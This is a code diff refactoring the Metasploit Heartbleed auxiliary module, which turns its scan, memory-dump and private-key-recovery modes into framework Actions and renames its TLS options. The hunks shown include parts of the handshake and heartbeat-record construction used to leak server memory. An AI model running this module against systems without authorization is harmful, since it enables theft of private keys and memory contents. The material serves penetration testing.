@@ -91,6 +91,9 @@ class Metasploit3 < Msf::Auxiliary
         exists in the handling of heartbeat requests, where a fake length can
         be used to leak memory data in the response. Services that support
         STARTTLS may also be vulnerable.
+
+        The module supports several actions, allowing for scanning, dumping of
+        memory contents, and private key recovery.
       },
       'Author'         => [
         'Neel Mehta', # Vulnerability discovery
@@ -117,15 +120,21 @@ class Metasploit3 < Msf::Auxiliary
           ['URL', 'http://filippo.io/Heartbleed/']
         ],
       'DisclosureDate' => 'Apr 7 2014',
-      'License'        => MSF_LICENSE
+      'License'        => MSF_LICENSE,
+      'Actions'        =>
+        [
+          ['SCAN',  {'Description' => 'Check hosts for vulnerability'}],
+          ['DUMP',  {'Description' => 'Dump memory contents'}],
+          ['KEYS',  {'Description' => 'Recover private keys from memory'}]
+        ],
+      'DefaultAction' => 'SCAN'
     )
 
     register_options(
       [
         Opt::RPORT(443),
-        OptEnum.new('STARTTLS', [true, 'Protocol to use with STARTTLS, None to avoid STARTTLS ', 'None', [ 'None', 'SMTP', 'IMAP', 'JABBER', 'POP3', 'FTP' ]]),
-        OptEnum.new('TLSVERSION', [true, 'TLS/SSL version to use', '1.0', ['SSLv3','1.0', '1.1', '1.2']]),
-        OptEnum.new('MODE', [true, 'Mode of operation', 'SCAN', ['SCAN', 'DUMP', 'KEYS']]),
+        OptEnum.new('TLS_CALLBACKS', [true, 'Protocol to use, "None" to use raw TLS sockets', 'None', [ 'None', 'SMTP', 'IMAP', 'JABBER', 'POP3', 'FTP' ]]),
+        OptEnum.new('TLS_VERSION', [true, 'TLS/SSL version to use', '1.0', ['SSLv3','1.0', '1.1', '1.2']]),
         OptInt.new('MAX_KEYTRIES', [true, 'Max tries to dump key', 10]),
         OptInt.new('STATUS_EVERY', [true, 'How many retries until status', 5]),
         OptRegexp.new('DUMPFILTER', [false, 'Pattern to filter leaked memory before storing', nil])
@@ -245,14 +254,14 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run_host(ip)
-    case datastore['MODE']
+    case action.name
     when 'SCAN'
       scan(bleed)
     when 'DUMP'
       scan(bleed)  # Scan & Dump are similar, scan() records results
     when 'KEYS'
-      unless datastore['STARTTLS'] == 'None'
-        print_error('STARTTLS Currently unsupported for Keydumping mode') #TODO
+      unless datastore['TLS_CALLBACKS'] == 'None'
+        print_error('TLS callbacks currently unsupported for keydumping action') #TODO
         return
       end
       print_status("#{peer} - Scanning for private keys")
@@ -290,8 +299,8 @@ class Metasploit3 < Msf::Auxiliary
         count += 1
       }
     else
-      #Shouldn't get here, since MODE is Enum
-      print_error("Unknown MODE: #{datastore['MODE']}")
+      #Shouldn't get here, since Action is Enum
+      print_error("Unknown Action: #{action.name}")
       return
     end
   end
@@ -329,7 +338,7 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
 
-    unless type == HEARTBEAT_RECORD_TYPE && version == TLS_VERSION[datastore['TLSVERSION']]
+    unless type == HEARTBEAT_RECORD_TYPE && version == TLS_VERSION[datastore['TLS_VERSION']]
       vprint_error("#{peer} - Unexpected Heartbeat response")
       disconnect
       return
@@ -386,7 +395,7 @@ class Metasploit3 < Msf::Auxiliary
     time_temp = Time.now
     time_epoch = Time.mktime(time_temp.year, time_temp.month, time_temp.day, 0, 0).to_i
 
-    hello_data = [TLS_VERSION[datastore['TLSVERSION']]].pack("n") # Version TLS
+    hello_data = [TLS_VERSION[datastore['TLS_VERSION']]].pack("n") # Version TLS
     hello_data << [time_epoch].pack("N")    # Time in epoch format
     hello_data << Rex::Text.rand_text(28)   # Random
     hello_data << "\x00"                    # Session ID length
@@ -410,7 +419,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def ssl_record(type, data)
-    record = [type, TLS_VERSION[datastore['TLSVERSION']], data.length].pack('Cnn')
+    record = [type, TLS_VERSION[datastore['TLS_VERSION']], data.length].pack('Cnn')
     record << data
   end
 
@@ -452,9 +461,9 @@ class Metasploit3 < Msf::Auxiliary
   def establish_connect
     connect
 
-    unless datastore['STARTTLS'] == 'None'
-      vprint_status("#{peer} - Trying to start SSL via #{datastore['STARTTLS']}")
-      res = self.send(TLS_CALLBACKS[datastore['STARTTLS']])
+    unless datastore['TLS_CALLBACKS'] == 'None'
+      vprint_status("#{peer} - Trying to start SSL via #{datastore['TLS_CALLBACKS']}")
+      res = self.send(TLS_CALLBACKS[datastore['TLS_CALLBACKS']])
       if res.nil?
         vprint_error("#{peer} - STARTTLS failed...")
         return
